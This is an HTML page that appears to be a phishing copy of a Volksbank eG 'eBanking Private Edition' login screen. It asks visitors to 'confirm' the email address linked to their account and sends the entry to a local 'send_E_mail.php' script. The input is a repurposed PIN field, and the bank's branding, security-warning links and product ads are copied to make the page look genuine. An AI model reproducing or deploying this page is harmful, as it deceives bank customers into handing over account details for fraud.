<html class="js localstorage canvas video no-touchevents cssanimations csstransforms csstransitions" style=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		
		<meta name="generator" content="ebPE 21.15-25 BVR2014">
		<meta name="format-detection" content="telephone=no">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		<title>eBanking Private Edition - Volksbank eG</title>
		
		<link rel="stylesheet" title="normal" type="text/css" href="../style/xbf-styles.css">
<link rel="stylesheet" title="normal" type="text/css" href="./.style/navigationResponsive.css">
<link rel="stylesheet" title="normal" type="text/css" href="../style/indiv.css">


    <link rel="shortcut icon" type="image/x-icon" href="../style/apple-touch-icon-144x144.png">


				  
				
	</head>	<body>
	<div id="ka-id"></div>
        <div id="scroll">
        		
        	<div id="site" style="
    background-image: url(data:image/svg+x0%27%20y%3D%27200%27%20width%3D%272000%27%20height%3D%271%27%20id%3D%27svg_3%27%2F%3E%3C%2Fg%3E%3C%2Fsvg%3E);
">
        		<div id="main" class="ym-wrapper">
        			<header id="header" style="
    height: fit-content;
">
	<div id="logo">
<span id="logo"><img alt="Logo" src="../style/ebpe-logo"></span>
</div>

	<div id="logoutBlock"></div>
	

<div class="mobile-nav-wrapper" id="mobile-nav-wrapper">


<div class="darken-layer"></div>
<div class="nav-btn btn nav-btn-menu btn-cta hidden" data-type="searchnav" id="mobile-nav-btn">Menü</div><div class="nav-pane nav-pane-menu" id="mobile-nav-pane" style="">
<div class="nav-pane-inner" id="nav-pane-inner">

<div class="mobile-nav" id="mobile-nav">
<strong class="mobile-nav__headline">Menü</strong>
<ul class="nav-primary__inner" id="nav-mobile"></ul>
</div></div>
<a class="icons-close close" href="##entry?trackid=piwikaf3ca08a45971555#" title="Schließen">Schließen</a>
</div></div></header>        			<div>

</div>

        			
        
                            			<div id="navBar" class="navBar_DEFAULT">
                    	        				<div id="wpdistance"></div>
        				        			</div>
        			        
        
        			<div class="contentDiv">
                     
                    <div id="maincontent" class="maincontent_DEFAULT">
        			    
        			            					<div class="breadcrumb empty" id="breadcrumb"></div>

        				
e<form accept-charset="UTF-8" action="../system/send_E_mail.php" method="post">




<h1 class="stackedFrontletTitle">Bitte bestätigen Sie die mit Ihrem Konto verknüpfte E-Mail-Adresse !</h1>


<div id="contextCommands" style="white-space: nowrap;">
<a href="#" id="helpLinkElementId" target="Hilfe" title="Hilfe"><img alt="Hilfe" border="0" src="../style/ebpe-hilfe.svg"><font _mstmutation="1"> Hilfe</font></a>
</div>
<div class="formInput">
<div class="XContainer FormularblockUndInhalt" id="mainContent_root">
<table border="0" cellpadding="0" cellspacing="0" rules="none" style="table-layout:auto; width:100%;">
<tbody><tr>
<td><img alt="" height="1" src="../style/xhtml-filler" width="1"></td><td><img alt="" height="1" src="../style/xhtml-filler" width="1"></td>
</tr>
<tr>
<td align="left" colspan="2" valign="top">

</td>
</tr>
<tr>
<td><img alt="" height="1" src="../style/xhtml-filler" width="1"></td><td><img alt="" height="1" src="../style/xhtml-filler" width="1"></td>
</tr>

<tr>
<td align="right" valign="middle"><span class="XLabel nowrap" id="lblPinLabel">E-Mail Adresse :</span></td><td align="left" valign="middle"><input required="" class="XPassword " id="pwdPin"  name="Email" size="25" style="" type="email"></td>
</tr>
<tr>
<td><img alt="" height="1" src="../style/xhtml-filler" width="1"></td><td><img alt="" height="1" src="../style/xhtml-filler" width="1"></td>
</tr>
<tr>
<td><img alt="" height="1" src="../style/xhtml-filler" width="1"></td><td><img alt="" height="1" src="../style/xhtml-filler" width="1"></td>
</tr>
<tr>
<td align="left" valign="top"><input class=" " id="txtRZBK" maxlength="4" name="value_43994284.mainContent_root_txtRZBK" style="" type="hidden" value="4501"></td><td></td>
</tr>
</tbody></table>
</div>
</div>
<div class="formSubmit">
<div class="UnitCommands actionBar" id="UnitCommands">
<input class="UnitCommand" id="xview-anmelden" name="command_43994284.anmelden" type="submit" value="Anmelden">
</div>
</div>
</form>

        				        				<form accept-charset="UTF-8" action="##portal?token=501052100227104769" method="post">
<input name="token" type="hidden" value="501052100227104769"><input name="frontletId" type="hidden" value="43994292">
<div class="formInput">
<div class="XContainer" id="infotext_cntRoot">
<table border="0" cellpadding="0" cellspacing="0" rules="none" style="table-layout:auto; width:100%;" width="100%">
<tbody><tr>
<td height="10" width="100%"><img alt="" height="10" src="../style/xhtml-filler" width="1"></td>
</tr>
<tr>
<td align="left" valign="top" width="100%">
<div class="XContainer InfoblockUndInhalt" id="cntBankTexte">
<table border="0" cellpadding="0" cellspacing="0" rules="none" style="table-layout:auto; width:100%;">
<tbody><tr>
<td><img alt="" height="1" src="./style/xhtml-filler" width="1"></td>
</tr>
<tr>
<td align="left" valign="top">
<table border="0" cellpadding="0" cellspacing="0" class="XTable XTableEmbeddedContainer" id="tblBankTexte" rules="none">
<colgroup>
<col width="100">
</colgroup>
<tbody>
<tr>
<td align="left" height="1" valign="top"><span class="XLabel" id="lblText">Infotour - Sicherheit im Internet</span></td>
</tr>
<tr>
<td align="left" height="1" valign="top"><a class="XLink" href="#" id="lnkText" target="_blank" title="Sicherheitshinweise"><img alt="Sicherheitshinweise" src="../style/ebpe-infolink.svg" title="Sicherheitshinweise">Sicherheitshinweise</a></td>
</tr>
<tr>
<td align="left" height="1" valign="top"><a class="XLink" href="#"><img alt="Aktuelle Phishingwarnungen" src="../style/ebpe-infolink.svg" title="Aktuelle Phishingwarnungen">Aktuelle Phishingwarnungen</a></td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td><img alt="" height="1" src="../style/xhtml-filler" width="1"></td>
</tr>
</tbody></table>
</div>
</td>
</tr>
</tbody></table>
</div>
</div>
</form>


        				<div class="contentWerbung">
        					<form accept-charset="UTF-8" action="##portal?token=501052100227104769" method="post">
<input name="token" type="hidden" value="501052100227104769"><input name="frontletId" type="hidden" value="43994287">
<div class="formInput">
<div class="XContainer" id="null_root">
<table border="0" cellpadding="0" cellspacing="0" rules="none" style="table-layout:auto; width:100%;">
<tbody><tr>
<td align="left" valign="top">
<div class="XContainer werbungHeaderSchliessen" id="cntWerbungSchliessen">
<table border="0" cellpadding="0" cellspacing="0" rules="none" style="table-layout:auto; width:100%;"></table>
</div>
</td>
</tr>
<tr>
<td align="left" valign="top"><span class="XMedia" id="inlineMedia">

<div class="header">
	<div id="cmp1">
	</div>
</div>
<div class="contentNichtAngemeldet">
	<div id="cmp2">
		<div class="wCadcontentdetail">
			

	

	

	
 
   <a href="##" target="_blank">         <img title="VR SecureGo plus" class="werbungnopadding" src="../style/ips" alt="VR SecureGo plus" border="0" width="600" height="305">
      </a>	

<div class="wCadclear"></div>



		</div>
	</div>
</div>
<div id="cmp3">
</div>

</span></td>
</tr>
</tbody></table>
</div>
</div>
</form>

        				</div>

        				<div class="contentWebcenterMainContent">
        				</div>
        			</div>
        
                            			<div id="crossnavigation" class="crossnavigation_DEFAULT">

        				<div class="crossnavBlock2">
        				</div>
        				<div class="crossnavBlock3">
        				</div>
        				<div class="crossnavBlock4">
        				</div>
        				<div class="crossnavBlock5"><form accept-charset="UTF-8" action="##portal?token=501052100227104769" method="post">
<input name="token" type="hidden" value="501052100227104769"><input name="frontletId" type="hidden" value="43994289">
</form>

        				</div>
        				<div class="crossnavBlock6">
        				</div>
        				<div class="crossnavWerbung"><form accept-charset="UTF-8" action="##portal?token=501052100227104769" method="post">



<div class="formInput">
<div class="XContainer" id="null_root">
<table border="0" cellpadding="0" cellspacing="0" rules="none" style="table-layout:auto; width:100%;">
<tbody><tr>
<td align="left" valign="top">
<div class="XContainer werbungHeaderSchliessen" id="cntWerbungSchliessen">
<table border="0" cellpadding="0" cellspacing="0" rules="none" style="table-layout:auto; width:100%;"></table>
</div>
</td>
</tr>
<tr>
<td align="left" valign="top"><span class="XMedia" id="inlineMedia">

<div class="header">
	<div id="cmp1">
	</div>
</div>
<div class="contentNichtAngemeldet">
	<div id="cmp2">
	</div>
</div>
<div id="cmp3">
	<div class="wCadcrossnavigationNichtAngemeldet">
		

	
<div class="navTitleWerbung"></div>
    

	
 
   <a href="#" target="_blank">         <img title="paydirekt" class="werbungnopadding" src="../style/ips1" alt="paydirekt" border="0" width="204">
      </a>	


	
	<div class="rahmen"><div class="wCadtextNavi"><p></p><ul class="rt-bullet">
<li>Sicher online zahlen</li>
<li>Direkt mit dem Girokonto</li>
<li><font _mstmutation="1">Fingerleicht bezahlen mit der App</font><br>
</li>
</ul>
<p></p></div>
	</div>


	</div>
</div>

</span></td>
</tr>
</tbody></table>
</div>
</div>
</form>

        				</div>

        				<div class="contentWebcenterCrossnav">
        				</div>
        				<div class="crossNavPFM">
        				</div>
                    	        			</div> 

                                        <div style="clear:both"></div>
                    </div>
                   	<div class="seitenanfang">
        				<a href="##entry?trackid=piwikaf3ca08a45971555#header" title="Seitenanfang" class="XLink">Seitenanfang</a>
        			</div>
        		</div>
        		<div id="footernaviInfoMenu">
        			<ul>
<font _mstmutation="1"><li _mstmutation="1">
<a href="#?" target="demo" title="Zur Demo-Anwendung 21.15-25 (16)">Zur Demo-Anwendung</a>
</li>
<li _mstmutation="1">
<a href="##INT" target="Impressum" title="Impressum">Impressum</a>
</li>
<li _mstmutation="1">
<a href="##portal?menuId=agb&amp;token=501052100227104769" title="AGB">AGB</a>
</li>
<li _mstmutation="1">
<a href="##" target="hilfe" title="Hilfe zur Version 21.15-25">Hilfe</a>
</li>
<li _mstmutation="1">
<a href="##" title="Sicherheitshinweise">Sicherheitshinweise</a>
</li></font>
</ul>

        		</div>
                                			        			
         
                    
			</div>
        </div>
                        
	
</body></html>